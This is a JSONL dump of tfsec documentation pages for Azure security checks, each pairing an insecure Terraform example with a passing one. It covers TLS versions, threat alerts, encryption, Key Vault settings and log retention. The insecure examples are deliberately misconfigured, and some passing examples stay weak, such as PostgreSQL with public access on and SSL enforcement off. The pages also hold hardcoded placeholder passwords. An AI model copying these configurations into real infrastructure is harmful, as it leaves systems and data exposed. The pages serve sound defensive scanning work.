[https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#retention_in_days){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview](https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:45.125032"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/secure-tls-policy/index.md", "content": "---\ntitle: Databases should have the minimum TLS set for connections\n---\n\n# Databases should have the minimum TLS set for connections\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nYou should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.\n\n### Possible Impact\nOutdated TLS policies increase exposure to known issues\n\n### Suggested Resolution\nUse the most modern TLS policies available\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_mssql_server\" \"bad_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"missadministrator\"\n   administrator_login_password = \"thisIsKat11\"\n   minimum_tls_version          = \"1.1\"\n }\n \n resource \"azurerm_postgresql_server\" \"bad_example\" {\n \tname                = \"bad_example\"\n   \n \tpublic_network_access_enabled    = true\n \tssl_enforcement_enabled          = false\n \tssl_minimal_tls_version_enforced = \"TLS1_1\"\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_mssql_server\" \"good_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"missadministrator\"\n   administrator_login_password = \"thisIsKat11\"\n   minimum_tls_version          = \"1.2\"\n }\n \n resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"bad_example\"\n \n   public_network_access_enabled    = true\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server#minimum_tls_version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_minimal_tls_version_enforced){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_minimal_tls_version_enforced){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:45.385103"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/threat-alert-email-set/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/threat-alert-email-set/index.md", "content": "---\ntitle: At least one email address is set for threat alerts\n---\n\n# At least one email address is set for threat alerts\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nSQL Server sends alerts for threat detection via email, if there are no email addresses set then mitigation will be delayed.\n\n### Possible Impact\nNobody will be promptly alerted in the case of a threat being detected\n\n### Suggested Resolution\nProvide at least one email address for threat alerts\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-threat-alert-email-set check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   email_addresses = []\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-threat-alert-email-set check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   email_addresses = [\"db-security@acme.org\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:45.673923"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/threat-alert-email-to-owner/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/threat-alert-email-to-owner/index.md", "content": "---\ntitle: Security threat alerts go to subscription owners and co-administrators\n---\n\n# Security threat alerts go to subscription owners and co-administrators\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nSubscription owners should be notified when there are security alerts. By ensuring the administrators of the account have been notified they can quickly assist in any required remediation\n\n### Possible Impact\nAdministrators and subscription owners may have a delayed response\n\n### Suggested Resolution\nEnable email to subscription owners\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-threat-alert-email-to-owner check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n   ]\n   email_account_admins = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-threat-alert-email-to-owner check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = []\n \n   email_account_admins = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:45.961644"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/datafactory/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/datafactory/no-public-access/index.md", "content": "---\ntitle: Data Factory should have public access disabled, the default is enabled.\n---\n\n# Data Factory should have public access disabled, the default is enabled.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nData Factory has public access set to true by default.\n\nDisabling public network access is applicable only to the self-hosted integration runtime, not to Azure Integration Runtime and SQL Server Integration Services (SSIS) Integration Runtime.\n\n### Possible Impact\nData factory is publicly accessible\n\n### Suggested Resolution\nSet public access to disabled for Data Factory\n\n\n### Insecure Example\n\nThe following example will fail the azure-datafactory-no-public-access check.\n```terraform\n\n resource \"azurerm_data_factory\" \"bad_example\" {\n   name                = \"example\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-datafactory-no-public-access check.\n```terraform\n\n resource \"azurerm_data_factory\" \"good_example\" {\n   name                = \"example\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   public_network_enabled = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/data-factory/data-movement-security-considerations#hybrid-scenarios](https://docs.microsoft.com/en-us/azure/data-factory/data-movement-security-considerations#hybrid-scenarios){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:46.511622"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/datalake/enable-at-rest-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/datalake/enable-at-rest-encryption/index.md", "content": "---\ntitle: Unencrypted data lake storage.\n---\n\n# Unencrypted data lake storage.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nDatalake storage encryption defaults to Enabled, it shouldn't be overridden to Disabled.\n\n### Possible Impact\nData could be read if compromised\n\n### Suggested Resolution\nEnable encryption of data lake storage\n\n\n### Insecure Example\n\nThe following example will fail the azure-datalake-enable-at-rest-encryption check.\n```terraform\n\n resource \"azurerm_data_lake_store\" \"bad_example\" {\n \tencryption_state = \"Disabled\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-datalake-enable-at-rest-encryption check.\n```terraform\n\n resource \"azurerm_data_lake_store\" \"good_example\" {\n \tencryption_state = \"Enabled\"\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/data-lake-store/data-lake-store-security-overview](https://docs.microsoft.com/en-us/azure/data-lake-store/data-lake-store-security-overview){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:46.952488"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/index.md", "content": "---\ntitle: azure\n---\n\n# azure\n\n## Services\n\n\n- [appservice](appservice)\n\n- [authorization](authorization)\n\n- [compute](compute)\n\n- [container](container)\n\n- [database](database)\n\n- [datafactory](datafactory)\n\n- [datalake](datalake)\n\n- [keyvault](keyvault)\n\n- [monitor](monitor)\n\n- [network](network)\n\n- [security-center](security-center)\n\n- [storage](storage)\n\n- [synapse](synapse)\n\n\n", "timestamp": "2025-10-24T22:24:47.182857"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/content-type-for-secret/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/content-type-for-secret/index.md", "content": "---\ntitle: Key vault Secret should have a content type set\n---\n\n# Key vault Secret should have a content type set\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nContent Type is an optional Key Vault Secret behavior and is not enabled by default.\n\nClients may specify the content type of a secret to assist in interpreting the secret data when it's retrieved. The maximum length of this field is 255 characters. There are no pre-defined values. The suggested usage is as a hint for interpreting the secret data.\n\n### Possible Impact\nThe secret's type is unclear without a content type\n\n### Suggested Resolution\nProvide content type for secrets to aid interpretation on retrieval\n\n\n### Insecure Example\n\nThe following example will fail the azure-keyvault-content-type-for-secret check.\n```terraform\n\n resource \"azurerm_key_vault_secret\" \"bad_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-keyvault-content-type-for-secret check.\n```terraform\n\n resource \"azurerm_key_vault_secret\" \"good_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n   content_type = \"password\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets](https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:47.615596"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/ensure-key-expiry/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/ensure-key-expiry/index.md", "content": "---\ntitle: Ensure that the expiration date is set on all keys\n---\n\n# Ensure that the expiration date is set on all keys\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nExpiration Date is an optional Key Vault Key behavior and is not set by default.\n\nSet when the resource will be become inactive.\n\n### Possible Impact\nLong life keys increase the attack surface when compromised\n\n### Suggested Resolution\nSet an expiration date on the vault key\n\n\n### Insecure Example\n\nThe following example will fail the azure-keyvault-ensure-key-expiry check.\n```terraform\n\n resource \"azurerm_key_vault_key\" \"bad_example\" {\n   name         = \"generated-certificate\"\n   key_vault_id = azurerm_key_vault.example.id\n   key_type     = \"RSA\"\n   key_size     = 2048\n \n   key_opts = [\n     \"decrypt\",\n     \"encrypt\",\n     \"sign\",\n     \"unwrapKey\",\n     \"verify\",\n     \"wrapKey\",\n   ]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-keyvault-ensure-key-expiry check.\n```terraform\n\n resource \"azurerm_key_vault_key\" \"good_example\" {\n   name         = \"generated-certificate\"\n   key_vault_id = azurerm_key_vault.example.id\n   key_type     = \"RSA\"\n   key_size     = 2048\n   expiration_date = \"1982-12-31T00:00:00Z\"\n \n   key_opts = [\n     \"decrypt\",\n     \"encrypt\",\n     \"sign\",\n     \"unwrapKey\",\n     \"verify\",\n     \"wrapKey\",\n   ]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/powershell/module/az.keyvault/update-azkeyvaultkey?view=azps-5.8.0#example-1--modify-a-key-to-enable-it--and-set-the-expiration-date-and-tags](https://docs.microsoft.com/en-us/powershell/module/az.keyvault/update-azkeyvaultkey?view=azps-5.8.0#example-1--modify-a-key-to-enable-it--and-set-the-expiration-date-and-tags){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:47.923749"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/ensure-secret-expiry/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/ensure-secret-expiry/index.md", "content": "---\ntitle: Key Vault Secret should have an expiration date set\n---\n\n# Key Vault Secret should have an expiration date set\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nExpiration Date is an optional Key Vault Secret behavior and is not set by default.\n\nSet when the resource will be become inactive.\n\n### Possible Impact\nLong life secrets increase the opportunity for compromise\n\n### Suggested Resolution\nSet an expiry for secrets\n\n\n### Insecure Example\n\nThe following example will fail the azure-keyvault-ensure-secret-expiry check.\n```terraform\n\n resource \"azurerm_key_vault_secret\" \"bad_example\" {\n   name         = \"secret-sauce\"\n   value        = \"szechuan\"\n   key_vault_id = azurerm_key_vault.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-keyvault-ensure-secret-expiry check.\n```terraform\n\n resource \"azurerm_key_vault_secret\" \"good_example\" {\n   name            = \"secret-sauce\"\n   value           = \"szechuan\"\n   key_vault_id    = azurerm_key_vault.example.id\n   expiration_date = \"1982-12-31T00:00:00Z\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets](https://docs.microsoft.com/en-us/azure/key-vault/secrets/about-secrets){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:48.216847"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/index.md", "content": "---\ntitle: keyvault\n---\n\n# keyvault\n\n## Checks\n\n\n- [content-type-for-secret](content-type-for-secret) Key vault Secret should have a content type set\n\n- [ensure-key-expiry](ensure-key-expiry) Ensure that the expiration date is set on all keys\n\n- [ensure-secret-expiry](ensure-secret-expiry) Key Vault Secret should have an expiration date set\n\n- [no-purge](no-purge) Key vault should have purge protection enabled\n\n- [specify-network-acl](specify-network-acl) Key vault should have the network acl block specified\n\n\n\n", "timestamp": "2025-10-24T22:24:48.342876"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/no-purge/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/no-purge/index.md", "content": "---\ntitle: Key vault should have purge protection enabled\n---\n\n# Key vault should have purge protection enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nPurge protection is an optional Key Vault behavior and is not enabled by default.\n\nPurge protection can only be enabled once soft-delete is enabled. It can be turned on via CLI or PowerShell.\n\n### Possible Impact\nKeys could be purged from the vault without protection\n\n### Suggested Resolution\nEnable purge protection for key vaults\n\n\n### Insecure Example\n\nThe following example will fail the azure-keyvault-no-purge check.\n```terraform\n\n resource \"azurerm_key_vault\" \"bad_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.bad_example.location\n     enabled_for_disk_encryption = true\n     purge_protection_enabled    = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-keyvault-no-purge check.\n```terraform\n\n resource \"azurerm_key_vault\" \"good_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.good_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/key-vault/general/soft-delete-overview#purge-protection](https://docs.microsoft.com/en-us/azure/key-vault/general/soft-delete-overview#purge-protection){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:48.622404"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/keyvault/specify-network-acl/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/keyvault/specify-network-acl/index.md", "content": "---\ntitle: Key vault should have the network acl block specified\n---\n\n# Key vault should have the network acl block specified\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nNetwork ACLs allow you to reduce your exposure to risk by limiting what can access your key vault. \n\nThe default action of the Network ACL should be set to deny for when IPs are not matched. Azure services can be allowed to bypass.\n\n### Possible Impact\nWithout a network ACL the key vault is freely accessible\n\n### Suggested Resolution\nSet a network ACL for the key vault\n\n\n### Insecure Example\n\nThe following example will fail the azure-keyvault-specify-network-acl check.\n```terraform\n\n resource \"azurerm_key_vault\" \"bad_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.bad_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-keyvault-specify-network-acl check.\n```terraform\n\n resource \"azurerm_key_vault\" \"good_example\" {\n     name                        = \"examplekeyvault\"\n     location                    = azurerm_resource_group.good_example.location\n     enabled_for_disk_encryption = true\n     soft_delete_retention_days  = 7\n     purge_protection_enabled    = false\n \n     network_acls {\n         bypass = \"AzureServices\"\n         default_action = \"Deny\"\n     }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/key-vault/general/network-security](https://docs.microsoft.com/en-us/azure/key-vault/general/network-security){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:48.919261"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/monitor/activity-log-retention-set/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/monitor/activity-log-retention-set/index.md", "content": "---\ntitle: Ensure the activity retention log is set to at least a year\n---\n\n# Ensure the activity retention log is set to at least a year\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nThe average time to detect a breach is up to 210 days, to ensure that all the information required for an effective investigation is available, the retention period should allow for delayed starts to investigating.\n\n### Possible Impact\nShort life activity logs can lead to missing records when investigating a breach\n\n### Suggested Resolution\nSet a retention period that will allow for delayed investigation\n\n\n### Insecure Example\n\nThe following example will fail the azure-monitor-activity-log-retention-set check.\n```terraform\n\n resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n \n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-monitor-activity-log-retention-set check.\n```terraform\n\n resource \"azurerm_monitor_log_profile\" \"good_example\" {\n   name = \"good_example\"\n \n   retention_policy {\n     enabled = true\n     days    = 365\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/platform-logs-overview](https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/platform-logs-overview){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:49.353270"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/monitor/capture-all-activities/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/monitor/capture-all-activities/index.md", "content": "---\ntitle: Ensure log profile captures all activities\n---\n\n# Ensure log profile captures all activities\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLog profiles should capture all categories to ensure that all events are logged\n\n### Possible Impact\nLog profile must capture all activity to be able to ensure that all relevant information possible is available for an investigation\n\n### Suggested Resolution\nConfigure log profile to capture all activities\n\n\n### Insecure Example\n\nThe following example will fail the azure-monitor-capture-all-activities check.\n```terraform\n\n resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n \n   categories = []\n \n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-monitor-capture-all-activities check.\n```terraform\n\n resource \"azurerm_monitor_log_profile\" \"good_example\" {\n   name = \"good_example\"\n \n   categories = [\n \t  \"Action\",\n \t  \"Delete\",\n \t  \"Write\",\n   ]\n \n   retention_policy {\n     enabled = true\n     days    = 365\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log](https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters](https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:49.652360"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/monitor/capture-all-regions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/monitor/capture-all-regions/index.md", "content": "---\ntitle: Ensure activitys are captured for all locations\n---\n\n# Ensure activitys are captured for all locations\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nLog profiles should capture all regions to ensure that all events are logged\n\n### Possible Impact\nActivity may be occurring in locations that aren't being monitored\n\n### Suggested Resolution\nEnable capture for all locations\n\n\n### Insecure Example\n\nThe following example will fail the azure-monitor-capture-all-regions check.\n```terraform\n\n \n resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n \n   categories = []\n \n   locations = [\n     \"westus\",\n     \"global\",\n   ]\n \n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-monitor-capture-all-regions check.\n```terraform\n\n resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n   name = \"bad_example\"\n \n   categories = []\n \n   locations = [\n \t\"eastus\",\n \t\"eastus2\",\n \t\"southcentralus\",\n \t\"westus2\",\n \t\"westus3\",\n \t\"australiaeast\",\n \t\"southeastasia\",\n \t\"northeurope\",\n \t\"swedencentral\",\n \t\"uksouth\",\n \t\"westeurope\",\n \t\"centralus\",\n \t\"northcentralus\",\n \t\"westus\",\n \t\"southafricanorth\",\n \t\"centralindia\",\n \t\"eastasia\",\n \t\"japaneast\",\n \t\"jioindiawest\",\n \t\"koreacentral\",\n \t\"canadacentral\",\n \t\"francecentral\",\n \t\"germanywestcentral\",\n \t\"norwayeast\",\n \t\"switzerlandnorth\",\n \t\"uaenorth\",\n \t\"brazilsouth\",\n \t\"centralusstage\",\n \t\"eastusstage\",\n \t\"eastus2stage\",\n \t\"northcentralusstage\",\n \t\"southcentralusstage\",\n \t\"westusstage\",\n \t\"westus2stage\",\n \t\"asia\",\n \t\"asiapacific\",\n \t\"australia\",\n \t\"brazil\",\n \t\"canada\",\n \t\"europe\",\n \t\"global\",\n \t\"india\",\n \t\"japan\",\n \t\"uk\",\n \t\"unitedstates\",\n \t\"eastasiastage\",\n \t\"southeastasiastage\",\n \t\"centraluseuap\",\n \t\"eastus2euap\",\n \t\"westcentralus\",\n \t\"southafricawest\",\n \t\"australiacentral\",\n \t\"australiacentral2\",\n \t\"australiasoutheast\",\n \t\"japanwest\",\n \t\"jioindiacentral\",\n \t\"koreasouth\",\n \t\"southindia\",\n \t\"westindia\",\n \t\"canadaeast\",\n \t\"francesouth\",\n \t\"germanynorth\",\n \t\"norwaywest\",\n \t\"swedensouth\",\n \t\"switzerlandwest\",\n \t\"ukwest\",\n \t\"uaecentral\",\n \t\"brazilsoutheast\",\n   ]\n \n   retention_policy {\n     enabled = true\n     days    = 7\n   }\n }\n \n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters](https://docs.microsoft.com/en-us/cli/azure/monitor/log-profiles?view=azure-cli-latest#az_monitor_log_profiles_create-required-parameters){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:49.935662"}
